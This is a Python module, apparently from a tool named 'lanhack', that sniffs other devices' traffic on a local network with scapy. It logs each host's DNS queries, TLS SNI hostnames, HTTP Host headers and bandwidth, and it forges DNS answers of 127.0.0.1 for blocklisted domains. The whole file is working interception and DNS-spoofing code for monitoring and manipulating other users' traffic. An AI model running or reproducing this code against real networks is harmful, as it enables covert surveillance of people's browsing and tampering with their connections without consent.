import socket, struct, re, threading, time
from datetime import datetime
from collections import defaultdict

import scapy.all as scapy

from lanhack import config

def sniff_sites():
    try:
        scapy.conf.iface = config.iface
        _test = scapy.sniff(count=0, timeout=1, quiet=True)
        config.log(f"Sniffer: initialized on {config.iface}")
    except Exception as e:
        config.log(f"Sniffer: init error - {e}")
        print(f"[lanhack] Sniff init error: {e}", flush=True)
        config.sniff_error = str(e)
        return
    seen = defaultdict(set)
    def cb(pkt):
        if config.quit_flag: return
        ts = datetime.now().strftime("%H:%M:%S")
        if scapy.IP in pkt:
            s = pkt[scapy.IP].src; d = pkt[scapy.IP].dst
            if s != config.my_ip and s != config.gateway_ip and s != d:
                size = len(pkt)
                bw = config.bandwidth_data[s]
                bw.append(size)
                bw.pop(0)
                config.domain_hits["total_bytes_" + s] = config.domain_hits.get("total_bytes_" + s, 0) + size
        if pkt.haslayer(scapy.DNS) and pkt[scapy.DNS].qr == 0:
            q = pkt[scapy.DNSQR].qname.decode(errors='ignore').rstrip('.')
            if q.endswith(".in-addr.arpa") or q.endswith(".ip6.arpa"): return
            s = pkt[scapy.IP].src; d = pkt[scapy.IP].dst
            if s == config.my_ip or s == config.gateway_ip: return
            if q not in seen[s]: seen[s].add(q); config.captured_sites[s].append((ts,q,"dns",s,d)); config.domain_hits[q] = config.domain_hits.get(q, 0) + 1
            if config.global_dns_block:
                from lanhack.dns import _match_blocked
                if _match_blocked(q, config.dns_blocklist) or _match_blocked(q, list(config.custom_blocks.keys())):
                    config.log(f"SNIFFER spoofing DNS for {q} from {s}")
                    ip_hdr = scapy.IP(src=d, dst=s)
                    udp_hdr = scapy.UDP(sport=53, dport=pkt[scapy.UDP].sport)
                    dns_resp = scapy.DNS(
                        id=pkt[scapy.DNS].id,
                        qr=1, aa=1, ra=1,
                        qd=pkt[scapy.DNS].qd,
                        an=scapy.DNSRR(rrname=q, ttl=60, rdata="127.0.0.1", type="A")
                    )
                    scapy.send(ip_hdr/udp_hdr/dns_resp, verbose=False)
                    config.dns_spoof_count += 1
                    config.log(f"SNIFFER sent 127.0.0.1 for {q}")
        elif pkt.haslayer(scapy.TCP) and pkt.haslayer(scapy.Raw):
            try:
                s=pkt[scapy.IP].src; d=pkt[scapy.IP].dst
                if s==config.my_ip or s==config.gateway_ip or s==d: return
                pl=pkt[scapy.Raw].load
                if pkt[scapy.TCP].dport==443 or pkt[scapy.TCP].sport==443:
                    if pl[0]==0x16:
                        idx=pl.find(b'\x00\x00')
                        if idx>0 and idx+2<len(pl):
                            sl=struct.unpack('>H',pl[idx:idx+2])[0]
                            if idx+2+sl<=len(pl):
                                sni=pl[idx+2:idx+2+sl].decode(errors='ignore')
                                if sni and '.' in sni and sni not in seen[s]:
                                    seen[s].add(sni); config.captured_sites[s].append((ts,sni,"tls",s,d)); config.domain_hits[sni] = config.domain_hits.get(sni, 0) + 1
                elif b"Host:" in pl:
                    m=re.search(rb"Host:\s*(\S+)",pl)
                    if m:
                        h=m.group(1).decode(errors='ignore')
                        if h not in seen[s]: seen[s].add(h); config.captured_sites[s].append((ts,h,"http",s,d)); config.domain_hits[h] = config.domain_hits.get(h, 0) + 1
            except: pass
    try:
        scapy.sniff(iface=config.iface, prn=cb, store=False, filter="udp port 53 or tcp port 80 or tcp port 443", quiet=True)
    except Exception as e:
        print(f"[lanhack] Sniff runtime error: {e}", flush=True)
        config.sniff_error = str(e)
